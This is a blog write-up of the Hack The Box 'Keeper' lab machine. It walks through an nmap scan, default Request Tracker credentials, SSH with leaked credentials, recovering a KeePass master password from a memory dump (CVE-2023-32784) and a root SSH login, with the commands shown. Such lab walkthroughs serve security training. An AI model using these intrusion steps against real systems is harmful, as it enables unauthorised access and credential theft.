---
layout: single
title: Keeper - Hack The Box
excerpt: "Keeper is an easy-difficulty Linux machine that features a support ticketing system that uses default credentials. Enumerating the service, we are able to see clear text credentials that lead to SSH access. With 'SSH' access, we can gain access to a KeePass database dump file, which we can leverage to retrieve the master password. With access to the 'Keepass' database, we can access the root 'SSH' keys, which are used to gain a privileged shell on the host."
date: 2025-05-26
classes: wide
header:
  teaser: /img2/keeper.PNG
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - Abusing Request Tracker
  - Information Leakage
  - Obtaining KeePass password through memory dump [Privilege Escalation]
---


## Reconnaissance

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.11.227
```

![](/img2/Pasted%20image%2020250526123352.png)

- Add domain to local DNS

```bash
echo "10.10.11.227 tickets.keeper.htb" >> /etc/hosts
```

## Exploitation

- Request Tracker default credentials

![](/img2/Pasted%20image%2020250526125520.png)

> root
> password

- Leaked credentials

![](/img2/Pasted%20image%2020250526125621.png)

- Conect to ssh 

```bash
ssh 10.10.11.227 -l lnorgaard
```

## Post-exploitation

- Extract Keepass dump (CVE-2023-32784)

```bash
scp lnorgaard@10.10.11.227:/home/lnorgaard/RT30000.zip .
```

```bash
7z x RT30000.zip
```

https://github.com/vdohney/keepass-password-dumper

```bash
dotnet run ../KeePassDumpFull.dmp
```

![](/img2/Pasted%20image%2020250526140145.png)

![](/img2/Pasted%20image%2020250526140223.png)
- Read kdbx database file

```bash
keepassxc ../passcodes.kdbx
```

![](/img2/Pasted%20image%2020250526140340.png)

- Create ssh private key with PuTTY-User-Key-File

![](/img2/Pasted%20image%2020250526140924.png)

```bash
puttygen pass.ppk -O private-openssh -o id_rsa
```

```bash
ssh -i id_rsa root@10.10.11.227
```

![](/img2/Pasted%20image%2020250526140832.png)